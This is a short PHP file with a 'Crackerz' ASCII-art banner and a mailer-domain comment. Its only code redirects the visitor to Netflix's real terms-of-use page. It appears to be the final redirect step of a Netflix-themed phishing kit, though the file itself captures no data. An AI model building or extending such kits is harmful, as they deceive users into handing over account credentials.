<?php

/* Programmer name :

    ╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
    ╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
    ╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

        #2018  Mailer-inbox-unlimited.gq  */
    
    echo '<script type="text/javascript">window.location.replace("https://help.netflix.com/legal/termsofuse");</script>';

?>